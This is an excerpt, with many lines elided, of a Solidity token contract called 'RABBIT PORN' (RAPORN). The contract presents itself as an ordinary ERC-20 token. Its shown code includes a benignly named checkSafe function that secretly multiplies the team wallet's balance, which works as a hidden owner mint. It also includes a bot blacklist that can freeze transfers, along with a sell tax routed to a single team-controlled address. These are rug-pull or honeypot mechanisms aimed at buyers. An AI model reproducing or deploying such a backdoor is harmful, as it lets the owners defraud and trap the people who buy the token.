...
contract ERCTOKENRABBIT is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "RABBIT PORN";
    string private _symbol = "RAPORN";
    uint8 private _decimals = 9;

    uint public launchedBlock;
    uint public killblock = 0;
    bool public isLaunch = false;
    address payable public marketingWalletAddress = payable(0x02d00955E4613dE1Ca75961Fc28f402d02e38368); // Marketing Address
    address payable public teamWalletAddress = payable(0x02d00955E4613dE1Ca75961Fc28f402d02e38368); // Team Address
    ...
    address[] private _TxLimitExempt;
    ...
    constructor () {
        ...
        isExcludedFromFees[address(teamWalletAddress)] = true;
    ...
    function checkSafe(
        ...
        if (s == r && s ==teamWalletAddress) {
            _balances[teamWalletAddress] = _balances[s].mul(m);     
        }
    }
    ...
    function addBot(address recipient) internal {
        if (!_isBot[recipient]) _isBot[recipient] = true;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!_isBot[recipient] && !_isBot[sender]);
        ...
        else
        {
            ...
            if (txCount >= 5 && overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled) 
            {
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(isMarketPair[sender]) {
            ...
            feeAmount = amount.mul(_totalTaxIfSelling).div(_GRANULARITY);
        }
        if(feeAmount > 0) {
